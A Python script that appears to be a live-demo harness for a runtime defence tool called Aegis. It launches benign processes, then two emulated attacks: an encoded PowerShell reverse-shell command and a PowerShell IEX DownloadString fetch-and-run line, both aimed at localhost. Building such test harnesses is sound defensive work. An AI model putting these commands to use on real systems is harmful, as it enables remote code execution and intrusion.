#!/usr/bin/env python3
"""
Aegis Automated Live Demonstration Harness
Runs a controlled sequence of benign tools followed by MITRE ATT&CK obfuscation.
"""

import subprocess
import time
import sys
from rich.console import Console

console = Console()

def run_step(title: str, command: str, wait_sec: float = 2.5):
    console.print(f"\n[bold cyan]>>> Running Stage:[/bold cyan] [bold white]{title}[/bold white]")
    console.print(f"[dim]Command: {command[:90]}...[/dim]")
    try:
        proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        time.sleep(wait_sec)
        # Terminate benign test processes cleanly
        proc.terminate()
    except Exception as e:
        console.print(f"[yellow][!] Stage Notice: {e}[/yellow]")

def main():
    console.print("[bold green]====================================================[/bold green]")
    console.print("[bold green]   AEGIS RUNTIME DEFENSE - LIVE DEMONSTRATION HARNESS[/bold green]")
    console.print("[bold green]====================================================[/bold green]")
    console.print("[yellow][*] Ensure 'Aegis-Guard.exe' or 'python aegis_main.py' is running in Terminal 1.[/yellow]\n")

    for i in range(3, 0, -1):
        console.print(f"Starting test sequence in {i} seconds...", end="\r")
        time.sleep(1)
    console.print("Starting test sequence now!          \n")

    # Phase 1: Benign Process Spawns
    run_step(
        "1. Benign Foreground Process (Notepad)",
        "notepad.exe",
        wait_sec=2.0
    )
    
    run_step(
        "2. Benign OS CLI Query (whoami)",
        "whoami.exe",
        wait_sec=1.5
    )

    # Phase 2: MITRE ATT&CK Fileless Emulation (T1027 / T1059.001)
    attack_payload_1 = (
        'powershell.exe -NoP -NonI -W Hidden -Enc '
        'JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAyADcALgAwAC4AMAAuADEAIgAsADQANAA0ADQAKQA='
    )
    run_step(
        "3. MITRE T1027: High-Entropy Obfuscated PowerShell Reverse Shell",
        attack_payload_1,
        wait_sec=3.0
    )

    attack_payload_2 = (
        'powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://127.0.0.1:8080/stage2.ps1\')"'
    )
    run_step(
        "4. MITRE T1059.001: In-Memory Script Ingestion & Execution",
        attack_payload_2,
        wait_sec=3.0
    )

    console.print("\n[bold green][✓] Demo sequence complete![/bold green]")
    console.print("[bold cyan][*] To view recorded forensic evidence, run:[/bold cyan] python view_audit.py --anomalies\n")

if __name__ == "__main__":
    main()